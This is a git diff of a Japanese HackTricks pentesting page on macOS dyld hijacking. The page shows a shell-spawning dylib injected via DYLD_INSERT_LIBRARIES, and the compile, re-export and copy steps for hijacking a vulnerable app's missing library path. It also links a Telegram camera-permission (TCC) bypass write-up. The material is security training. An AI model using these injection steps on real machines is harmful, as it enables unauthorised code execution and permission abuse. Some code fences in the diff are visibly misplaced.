@@ -1,20 +1,22 @@
-# macOS Dyldハイジャッキング＆DYLD_INSERT_LIBRARIES
+# macOS Dyld ハイジャック & DYLD\_INSERT\_LIBRARIES
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>
 
-* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+HackTricksをサポートする他の方法:
+
+* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを**共有する**。
 
 </details>
 
-## DYLD\_INSERT\_LIBRARIESの基本的な例
+## DYLD\_INSERT\_LIBRARIES 基本例
 
-**シェルを実行するために注入するライブラリ**:
+シェルを実行するために**インジェクトするライブラリ**:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -43,11 +45,11 @@ printf("Hello, World!\n");
 return 0;
 }
 ```
-インジェクション:
+インジェクション：
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Dyldハイジャックの例
+## Dyld ハイジャックの例
 
 対象の脆弱なバイナリは `/Applications/VulnDyld.app/Contents/Resources/lib/binary` です。
 
@@ -85,16 +87,12 @@ current version 1.0.0
 compatibility version 1.0.0
 # Check the versions
 ```
-{% endcode %}
-{% endtab %}
-{% endtabs %}
-
-前の情報から、**ロードされたライブラリの署名をチェックしていない**ことがわかります。そして、次の場所からライブラリをロードしようとしています。
+前述の情報から、**ロードされたライブラリの署名をチェックしていない**こと、そして以下からライブラリをロードしようとしていることがわかります：
 
 * `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 * `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
-しかし、最初の場所は存在しません：
+しかし、最初のものは存在しません：
 ```bash
 pwd
 /Applications/VulnDyld.app
@@ -102,9 +100,11 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-そうです、それを乗っ取ることが可能です！合法的なライブラリと同じ機能をエクスポートする任意のコードを実行するライブラリを作成し、それを再エクスポートするようにしてください。そして、予想されるバージョンでコンパイルすることを忘れないでください：
+```markdown
+だから、ハイジャックが可能です！**任意のコードを実行し、正規のライブラリと同じ機能をエクスポートする**ライブラリを作成し、それを再エクスポートします。予想されるバージョンでコンパイルすることを忘れないでください：
 
 {% code title="lib.m" %}
+```
 ```objectivec
 #import <Foundation/Foundation.h>
 
@@ -113,18 +113,16 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-{% endcode %}
-
-コンパイルします：
-
-{% code overflow="wrap" %}
+```
+コンパイルする：
+```
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
 {% endcode %}
 
-ライブラリで作成された再エクスポートパスは、ローダーに対して相対パスです。エクスポートするライブラリの絶対パスに変更しましょう。
+ライブラリ内に作成された再エクスポートパスはローダーに対して相対的です。エクスポートするライブラリへの絶対パスに変更しましょう：
 
 {% code overflow="wrap" %}
 ```bash
@@ -143,41 +141,41 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-{% endcode %}
-
-最後に、それを**ハイジャックされた場所**にコピーします：
-
-{% code overflow="wrap" %}
+```
+最終的には、**ハイジャックされた場所**にコピーします：
+```
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
 {% endcode %}
 
-そして、バイナリを**実行**して、**ライブラリがロードされたか**を確認します：
+そして、バイナリを**実行**し、**ライブラリがロードされた**ことを確認します：
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
-<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylibが/Applications/VulnDyld.app/Contents/Resources/lib/binaryにハイジャックされました
+<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
 </strong>使用法: [...]
 </code></pre>
 
 {% hint style="info" %}
-Telegramのカメラの許可を乱用するためにこの脆弱性を乱用する方法についての素晴らしい解説は、[https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)で見つけることができます。
+Telegramのカメラ権限を悪用するこの脆弱性を悪用する方法についての素晴らしい記事はこちらで見つけることができます [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {% endhint %}
 
 ## より大規模なスケール
 
-予期しないバイナリにライブラリを注入しようとする場合、イベントメッセージをチェックしてプロセス内でライブラリがロードされたタイミングを確認することができます（この場合、printfと`/bin/bash`の実行を削除してください）。
+予期しないバイナリにライブラリを注入しようと計画している場合、プロセス内でライブラリがロードされた時のイベントメッセージをチェックすることができます（この場合、printfと`/bin/bash`の実行を削除します）。
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** HackTricksであなたの会社を宣伝したいですか？または、**PEASSの最新バージョンにアクセスしたい**ですか？または、HackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **ハッキングのトリックを共有する**には、[**hacktricks repo**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。
+HackTricksをサポートする他の方法:
+
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
 
 </details>
